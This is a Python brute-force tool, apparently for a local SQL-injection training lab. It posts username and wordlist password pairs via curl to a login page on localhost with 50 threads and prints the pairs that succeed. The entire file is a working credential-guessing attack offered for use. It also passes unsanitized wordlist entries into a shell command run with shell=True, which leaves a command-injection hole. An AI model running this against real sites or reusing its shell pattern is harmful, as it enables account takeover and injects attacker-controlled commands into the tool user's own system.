#!/usr/bin/env python3

from concurrent.futures import ThreadPoolExecutor, as_completed
from termcolor import colored
import sys, signal, signal, argparse, pathlib, subprocess

class enum_crack:

    def __init__(self):
        self.arguments = self.argument()
        self.passwords = []
        self.usernames = []

        signal.signal(signal.SIGINT, self.ctrl_c)

    def ctrl_c(self, sig, frame):

        print(colored("\n\t[!] Exiting...", "red"))
        sys.exit(1)

    def argument(self):

        argu = argparse.ArgumentParser(description='Tool to enum users')
        argu.add_argument('-us', '--user', required=True, dest='username', help='Write a knowledge user')
        argu.add_argument('-pf', '--pasword_file', required=True, dest='path_wordlist', help='Path of wordlist you will use')

        return argu.parse_args()

    def provide_data(self, terms, path):

        if ',' in terms:
            for term in terms.split(','):
                if term:
                    path.append(term.strip())
        elif (pathlib.Path(terms).is_file()):
            with open(terms, 'r', errors='ignore') as term:
                for data in term.readlines():
                    path.append(data.strip())
        else:
            print(colored("\n\t[!] Bad Format of Data (It should be list format. Example: -us/-pf admin, || -us/-pf data.txt)", "red"))
            sys.exit(1)

    def check_data(self):
        
        if(self.arguments.username and self.arguments.path_wordlist):
            self.provide_data(self.arguments.path_wordlist, self.passwords)
            self.provide_data(self.arguments.username, self.usernames)
            print(colored(f"\n{'-'*20} Provided Files/Data {'-'*20}\n", "blue"))
            print(colored(f"\n\t[+] User: {self.arguments.username}", "magenta"))
            print(colored(f"\t[+] Password: {self.arguments.path_wordlist}", "magenta"))

            print(colored(f"\n{'-'*20} Enumerating {'-'*20}\n", "yellow"))
            self.cracking(self.usernames, self.passwords)
        else:
            print(colored("\n\t[!] You should Provide and username and password files(or write it by separating terms with a comma)", "red"))


    def cracking_data(self, username, password):

        command = f'curl -s -d "uid={username}&password={password}" -o /dev/null -w "%{{http_code}}\n" "http://127.0.0.1:8000/login1.php?msg=1"'
        result = subprocess.run(command, shell=True, text=True, capture_output=True)
        if (result.stdout.strip() == "302"):
            return colored(f"\t[+] Username: {username} - Password: {password}", "green")

    def cracking(self, usernames, passwords):

        for username in usernames:
            with ThreadPoolExecutor(max_workers=50) as worker:
                item_futured = {worker.submit(lambda p=password: self.cracking_data(username, p)): password for password in self.passwords}
                for future in as_completed(item_futured):
                    valid = future.result()
                    if valid:
                        print(valid)
                        for thread in item_futured:
                            thread.cancel()
                        break

def main():

    command = 'figlet "Enum Users Sqlitraining" | lolcat -f | boxes -d tex-box'
    subprocess.run(command, shell=True)
    poo_object = enum_crack()
    poo_object.check_data()

if __name__ == "__main__":

    main()
